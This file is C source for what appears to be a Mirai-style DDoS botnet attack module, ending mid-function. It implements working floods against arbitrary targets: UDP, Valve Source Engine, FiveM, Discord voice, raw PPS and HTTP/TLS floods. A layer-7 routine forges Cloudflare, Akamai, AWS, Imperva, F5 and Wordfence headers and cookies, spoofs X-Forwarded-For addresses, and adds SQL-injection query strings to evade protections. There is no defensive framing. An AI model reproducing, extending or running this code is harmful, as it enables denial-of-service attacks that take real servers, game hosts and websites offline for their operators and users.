#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static volatile BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

void attack_init(void) {
    int i = 0;

    methods[i].func = attack_udp_flood;         methods[i++].type = ATK_VEC_UDP;
    methods[i].func = attack_vse_flood;         methods[i++].type = ATK_VEC_VSE;
    methods[i].func = attack_fivem_flood;       methods[i++].type = ATK_VEC_FIVEM;
    methods[i].func = attack_pps_flood;         methods[i++].type = ATK_VEC_PPS;

    methods[i].func = attack_tls_flood;         methods[i++].type = ATK_VEC_TLS;
    methods[i].func = attack_http_flood;        methods[i++].type = ATK_VEC_HTTP;
    methods[i].func = attack_cf_flood;          methods[i++].type = ATK_VEC_CF;

    methods[i].func = attack_axis_l7;          methods[i++].type = ATK_VEC_AXISL7;

    methods[i].func = attack_dns_amp;           methods[i++].type = ATK_VEC_DNS_AMP;
    methods[i].func = attack_ntp_amp;           methods[i++].type = ATK_VEC_NTP_AMP;
    methods[i].func = attack_ssdp_amp;          methods[i++].type = ATK_VEC_SSDP_AMP;
    methods[i].func = attack_snmp_amp;          methods[i++].type = ATK_VEC_SNMP_AMP;
    methods[i].func = attack_cldap_amp;         methods[i++].type = ATK_VEC_CLDAP_AMP;

    /* Layer 4 TCP Methods */
    methods[i].func = attack_syn_flood;         methods[i++].type = ATK_VEC_SYN;
    methods[i].func = attack_ack_flood;         methods[i++].type = ATK_VEC_ACK;
    methods[i].func = attack_fin_flood;         methods[i++].type = ATK_VEC_FIN;
    methods[i].func = attack_rst_flood;         methods[i++].type = ATK_VEC_RST;
    methods[i].func = attack_tcpconn_flood;     methods[i++].type = ATK_VEC_TCPCONN;
    methods[i].func = attack_xmas_flood;        methods[i++].type = ATK_VEC_XMAS;
    methods[i].func = attack_null_flood;        methods[i++].type = ATK_VEC_NULL;
    methods[i].func = attack_window_flood;      methods[i++].type = ATK_VEC_WINDOW;

    /* Special Methods */
    methods[i].func = attack_icmp_flood;        methods[i++].type = ATK_VEC_ICMP;
    methods[i].func = attack_greip_flood;       methods[i++].type = ATK_VEC_GREIP;
    methods[i].func = attack_greeth_flood;      methods[i++].type = ATK_VEC_GREETH;
    methods[i].func = attack_discord_flood;     methods[i++].type = ATK_VEC_DISCORD;

    methods_len = i;
}

void attack_kill_all(void) {
    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++)
        attack_ongoing[i] = FALSE;
}

void attack_parse(char *buf, int len) {
    if (len < 5) return;

    uint8_t attack_id = buf[0];
    uint8_t targs_len = buf[1];
    if (targs_len == 0) return;

    struct attack_target targs[ATTACK_MAX_TARGETS];
    for (int i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = *((ipv4_t *)(buf + 2 + (i * 4)));
        targs[i].netmask = 32;
    }

    uint8_t opts_offset = 2 + (targs_len * 4) + 1;
    uint8_t opts_len = buf[opts_offset - 1];
    struct attack_option opts[ATTACK_MAX_OPTIONS];
    for (int i = 0; i < opts_len; i++) {
        opts[i].key = buf[opts_offset];
        uint8_t vlen = buf[opts_offset + 1];
        opts[i].val = (char *)&buf[opts_offset + 2];
        opts_offset += 2 + vlen;
    }

    attack_start(-1, attack_id, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t attack_id, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    for (int i = 0; i < methods_len; i++) {
        if (methods[i].type == attack_id) {
            attack_ongoing[0] = TRUE;
            methods[i].func(0, 32, targs, targs_len, opts, 0);
            attack_ongoing[0] = FALSE;
            break;
        }
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    for (int i = 0; i < opts_len; i++)
        if (opts[i].key == key)
            return opts[i].val;
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    return val ? util_atoi(val) : 0;
}

static inline void rand_str_safe(char *str, int len) {
    static char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < len; i++)
        str[i] = alphanum[rand_next() % (sizeof(alphanum) - 1)];
}

void attack_udp_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            /* Replace first target with resolved IP */
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    uint16_t payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1472;

    char *payload = malloc(payload_size);
    if (!payload) { close(fd); return; }

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            rand_str_safe(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    free(payload);
    close(fd);
}

void attack_vse_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 27015;

    /* Valve Source Engine A2S_INFO query - high amplification */
    char vse_payload[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            sendto(fd, vse_payload, sizeof(vse_payload) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_fivem_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 30120;

    /* FiveM protocol packets - getinfo, sec, token variants */
    char fiveminfo[15] = "\xff\xff\xff\xff\x67\x65\x74\x69\x6e\x66\x6f\x20\x78\x79\x7a";
    char fivesec[52] = "\x8f\xff\x90\x3c\x82\xff\x00\x01\x00\x00\xff\xff\x00\x00\x05\x14\x00\x01\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x88\x00\x00\x00\x02\x00\x00\x00\x02\x90\x3c\x5c\x16\x00\x00\x00\x00";
    char fivetoken[88] = "\x80\x00\x29\x5a\x01\xff\x00\x01\x00\x01\x83\xd6\x86\x00\x00\x01\x00\x46\x01\x00\x00\x00\x74\x6f\x6b\x65\x6e\x3d\x62\x31\x35\x33\x31\x36\x64\x63\x2d\x36\x63\x65\x39\x2d\x34\x62\x34\x32\x2d\x39\x31\x62\x35\x2d\x32\x36\x62\x65\x34\x37\x32\x32\x35\x63\x39\x38\x26\x67\x75\x69\x64\x3d\x31\x34\x38\x36\x31\x38\x37\x39\x32\x34\x35\x34\x33\x32\x30\x31\x31\x38";

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            int pkt = rand_next() % 3;
            if (pkt == 0) {
                sendto(fd, fiveminfo, sizeof(fiveminfo) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
            } else if (pkt == 1) {
                fivesec[2] = rand_next() % 128;
                fivesec[3] = rand_next() % 128;
                fivesec[44] = rand_next() % 128;
                fivesec[45] = rand_next() % 128;
                fivesec[46] = rand_next() % 128;
                fivesec[47] = rand_next() % 128;
                sendto(fd, fivesec, sizeof(fivesec) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
            } else {
                fivetoken[28] = 97 + (rand_next() % 26);
                for (int j = 29; j <= 33; j++) fivetoken[j] = 48 + (rand_next() % 10);
                fivetoken[34] = 97 + (rand_next() % 26);
                fivetoken[35] = 97 + (rand_next() % 26);
                fivetoken[37] = 48 + (rand_next() % 10);
                for (int j = 70; j <= 87; j++) fivetoken[j] = 48 + (rand_next() % 10);
                sendto(fd, fivetoken, sizeof(fivetoken) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
            }
        }
    }

    close(fd);
}

void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 50000 + (rand_next() % 1000);

    char payload[1472];
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            rand_str_safe(payload, sizeof(payload));
            sendto(fd, payload, sizeof(payload), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_http_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    char *url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    char *ua = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);
    int https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);

    static const char *http_uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0",
        NULL
    };

    char domain[256] = {0};
    int target_port = 80;

    /* If URL provided, parse it for domain/path/port */
    if (url && util_strlen(url) > 0) {
        char url_path[512] = {0};
        https = util_parse_url(url, domain, sizeof(domain) - 1, url_path, sizeof(url_path) - 1, &target_port);
        if (util_strlen(url_path) > 0 && (!path || util_strlen(path) == 0)) {
            path = url_path;
        }
    } else if (targs_len > 0) {
        /* Fall back to target IP as domain if no URL */
        char *dom_opt = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
        if (dom_opt) {
            util_strcpy(domain, dom_opt);
        } else {
            /* Resolve the target IP to a domain-like string or use target directly */
            uint8_t *b = (uint8_t *)&targs[0].addr.s_addr;
            snprintf(domain, sizeof(domain), "%d.%d.%d.%d", b[0], b[1], b[2], b[3]);
        }
        if (https) target_port = 443;
    }

    if (util_strlen(domain) == 0) util_strcpy(domain, "target.com");
    if (!path || util_strlen(path) == 0) path = "/";
    if (!ua || util_strlen(ua) == 0) ua = http_uas[rand_next() % 5];

    /* Resolve domain to IPs via DNS */
    struct resolv_entries *entries = resolv_lookup(domain);
    if (!entries || entries->count == 0) return;

    char req[2048];
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);

    int dns_idx = rand_next() % entries->count;

    for (int i = 0; i < entries->count; i++) {
        sin.sin_addr.s_addr = entries->addrs[(dns_idx + i) % entries->count];
        while (attack_ongoing[0]) {
            const char *use_ua = ua ? ua : http_uas[rand_next() % 5];
            int req_len = snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: keep-alive\r\n"
                "\r\n",
                path, domain, use_ua);

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd != -1) {
                fcntl(fd, F_SETFL, O_NONBLOCK);
                connect(fd, (struct sockaddr *)&sin, sizeof(sin));
                send(fd, req, req_len, MSG_NOSIGNAL);
                usleep(500);
                close(fd);
            }
        }
    }

    resolv_entries_free(entries);
}

void attack_pps_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            for (int j = 0; j < 10000; j++)
                sendto(fd, "x", 1, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }

    close(fd);
}

void attack_tls_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                      int targs_len, struct attack_option *opts, int opts_len) {
    char *url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    char *ua = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_USERAGENT);

    char url_domain[256] = {0};
    char url_path[512] = {0};
    int target_port = 443;

    /* If URL provided, parse it */
    if (url && util_strlen(url) > 0) {
        util_parse_url(url, url_domain, sizeof(url_domain) - 1, url_path, sizeof(url_path) - 1, &target_port);
        if (util_strlen(url_domain) > 0) domain = url_domain;
        if (util_strlen(url_path) > 0 && (!path || util_strlen(path) == 0)) path = url_path;
    }

    if (!domain) domain = "target.com";
    if (!path || util_strlen(path) == 0) path = "/";
    if (!ua || util_strlen(ua) == 0) ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

    /* Resolve domain to IPs via DNS */
    struct resolv_entries *entries = resolv_lookup(domain);
    if (!entries || entries->count == 0) {
        /* Fallback to target IPs if DNS fails */
        for (int i = 0; i < targs_len; i++) {
            char req[1024];
            int req_len = snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n",
                path, domain, ua);

            struct sockaddr_in sin = {0};
            sin.sin_family = AF_INET;
            sin.sin_addr.s_addr = targs[i].addr.s_addr;
            sin.sin_port = htons(target_port);

            while (attack_ongoing[0]) {
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd == -1) continue;
                fcntl(fd, F_SETFL, O_NONBLOCK);
                connect(fd, (struct sockaddr *)&sin, sizeof(sin));
                send(fd, req, req_len, MSG_NOSIGNAL);
                usleep(1000);
                close(fd);
            }
        }
        return;
    }

    char req[1024];
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n\r\n",
        path, domain, ua);

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);

    int dns_idx = rand_next() % entries->count;

    for (int i = 0; i < entries->count; i++) {
        sin.sin_addr.s_addr = entries->addrs[(dns_idx + i) % entries->count];
        while (attack_ongoing[0]) {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) continue;
            fcntl(fd, F_SETFL, O_NONBLOCK);
            connect(fd, (struct sockaddr *)&sin, sizeof(sin));
            send(fd, req, req_len, MSG_NOSIGNAL);
            usleep(1000);
            close(fd);
        }
    }

    resolv_entries_free(entries);
}

void attack_tlsplus_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);

    if (!domain) domain = "target.com";
    if (!path) path = "/";

    static const char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    };

    char req[2048];
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(443);

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        while (attack_ongoing[0]) {
            const char *ua = user_agents[rand_next() % 4];
            int req_len = snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n\r\n",
                path, domain, ua);

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) continue;
            fcntl(fd, F_SETFL, O_NONBLOCK);
            connect(fd, (struct sockaddr *)&sin, sizeof(sin));
            send(fd, req, req_len, MSG_NOSIGNAL);
            usleep(500);
            close(fd);
        }
    }
}

void attack_cf_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                     int targs_len, struct attack_option *opts, int opts_len) {
    attack_tlsplus_flood(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

static char *l7_user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    NULL
};

static void gen_resip(char *b) {
    snprintf(b, 16, "%d.%d.%d.%d", 24+(rand_next()%30), rand_next()%256, rand_next()%256, 1+(rand_next()%254));
}
static char l7ua[][160] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
};
static char *meths[] = {"GET","GET","GET","POST","POST","HEAD","OPTIONS","PATCH",NULL};
static char *pthfix[] = {"/%s","/./%s","/.//%s","/%s?","/%s%%00","/%%2e%s",NULL};
static char *cfhd[] = {"CF-Connecting-IP: %s","CF-IPCountry: US","CF-RAY: %08x%08x-%02x",NULL};
static char *akhd[] = {"X-Akamai-Edgescape: georegion=494,country=US","X-Akamai-Request-ID: %08x","X-Akamai-SSL-Client-Sid: %04x",NULL};
static char *awshd[] = {"x-amzn-RequestId: %08x-%04x-%04x-%04x-%012x","AWSALB: %08x%08x%08x%08x","CloudFront-Viewer-Country: US",NULL};
static char *imphd[] = {"incap_ses_12345: %08x%08x","visid_incap_12345: %016x%016x","X-Forwarded-For: %s",NULL};
static char *f5ck[] = {"BIGipServerpool_80=%u.0000.0000","TS01%04x=%08x%08x%08x%08x",NULL};
static char *azhd[] = {"x-azure-ref: %08x%08x%08x%08x","X-Azure-Ref-OriginShield: %08x%08x",NULL};
static char *schd[] = {"sucuri_cloudproxy_uid: %08x","X-Sucuri-Cache: HIT","X-Sucuri-ID: %05d",NULL};
static char *wfck[] = {"wfvt_%u=%08x%08x; wordfence_verifiedHuman=1","wfvt_%u=1; wfvt_%u=2",NULL};
static char *msqp[] = {"?id=1/**/AND/**/1=1--","?id=1%27%20OR%201%3D1--","?id=1%0AOR%0A1%3D1",NULL};
static char *h2hd[] = {"TE: trailers","Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"","Sec-CH-UA-Mobile: ?0","Sec-CH-UA-Platform: \"Windows\"",NULL};
static char *cachd[] = {"Cache-Control: no-cache, no-store","Pragma: no-cache","X-Cache-Bypass: %u","X-Request-ID: %08x-%04x-%04x",NULL};
static char cfpad[131072], akpad[8192];
static int cfinited=0;
void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                    int targs_len, struct attack_option *opts, int opts_len) {
    char *url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    char *path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
    char *cookies = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_COOKIES);
    int https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);

    char url_domain[256] = {0};
    char url_path[512] = {0};
    int target_port = 443;

    /* If URL provided, parse it */
    if (url && util_strlen(url) > 0) {
        https = util_parse_url(url, url_domain, sizeof(url_domain) - 1, url_path, sizeof(url_path) - 1, &target_port);
        if (util_strlen(url_domain) > 0) domain = url_domain;
        if (util_strlen(url_path) > 0 && (!path || util_strlen(path) == 0)) path = url_path;
    }

    if (!domain) domain = "target.com";
    if (!path || util_strlen(path) == 0) path = "/";
    if (!cfinited) { memset(cfpad,'B',sizeof(cfpad)-1); cfpad[sizeof(cfpad)-1]=0; memset(akpad,'C',sizeof(akpad)-1); akpad[sizeof(akpad)-1]=0; cfinited=1; }

    /* Resolve domain to IPs via DNS */
    struct resolv_entries *entries = resolv_lookup(domain);
    if (!entries || entries->count == 0) return;

    char req[16384], rip[16], tpath[256];
    int rt;
    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);

    int dns_idx = rand_next() % entries->count;

    for (int i = 0; i < entries->count; i++) {
        sin.sin_addr.s_addr = entries->addrs[(dns_idx + i) % entries->count];
        while (attack_ongoing[0]) {
            gen_resip(rip);
            snprintf(tpath, sizeof(tpath), pthfix[rand_next()%6], path);
            rt = rand_next() % 10;
            if (rt < 3) {
                snprintf(req, sizeof(req), "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\nCache-Control: max-age=0\r\n%s: %s\r\n%s: %s\r\nCF-Connecting-IP: %s\r\n%s: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\ncf_chl_opt=Ym90X2RldGVjdGlvbl9wYXJhbXM9e30&%s",
                    tpath, domain, l7ua[rand_next()%5], cfhd[rand_next()%3], cfhd[rand_next()%3], rip, cfhd[rand_next()%3], cfhd[rand_next()%3], rip, cfhd[rand_next()%3], cfhd[rand_next()%3], (int)sizeof(cfpad), cfpad);
            } else if (rt < 5) {
                char akv[128]; snprintf(akv,sizeof(akv),akhd[rand_next()%3],rand_next(),rand_next());
                snprintf(req, sizeof(req), "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\n%s: %s\r\nX-Forwarded-For: %s\r\nX-Real-IP: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\naction=submit%s",
                    tpath, domain, l7ua[rand_next()%5], akhd[rand_next()%3], akv, rip, rip, (int)sizeof(akpad), akpad);
            } else if (rt < 7) {
                char awv[128]; snprintf(awv,sizeof(awv),awshd[rand_next()%3],rand_next(),rand_next()&0xffff,rand_next()&0xffff,rand_next()&0xffff,rand_next());
                snprintf(req, sizeof(req), "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nX-Forwarded-For: %s\r\nX-Forwarded-Proto: https\r\nCloudFront-Forwarded-Proto: https\r\nCloudFront-Is-Mobile-Viewer: false\r\n%s: %s\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n",
                    meths[rand_next()%8], tpath, domain, l7ua[rand_next()%5], rip, awshd[rand_next()%3], awv);
            } else if (rt < 8) {
                char imv[256]; snprintf(imv,sizeof(imv),imphd[rand_next()%3],rand_next(),rand_next(),rand_next());
                snprintf(req, sizeof(req), "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nX-Forwarded-For: %s\r\nX-Real-IP: %s\r\n%s: %s\r\nSec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\r\nSec-CH-UA-Mobile: ?0\r\n\r\n",
                    meths[rand_next()%8], tpath, domain, l7ua[rand_next()%5], rip, rip, imphd[rand_next()%3], imv);
            } else if (rt < 9) {
                char f5v[256]; snprintf(f5v,sizeof(f5v),f5ck[rand_next()%2],rand_next(),rand_next(),rand_next(),rand_next(),rand_next());
                snprintf(req, sizeof(req), "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: %s\r\nX-Forwarded-For: %s\r\nX-Real-IP: %s\r\n\r\n",
                    meths[rand_next()%8], tpath, domain, l7ua[rand_next()%5], f5v, rip, rip);
            } else if (rt == 9) {
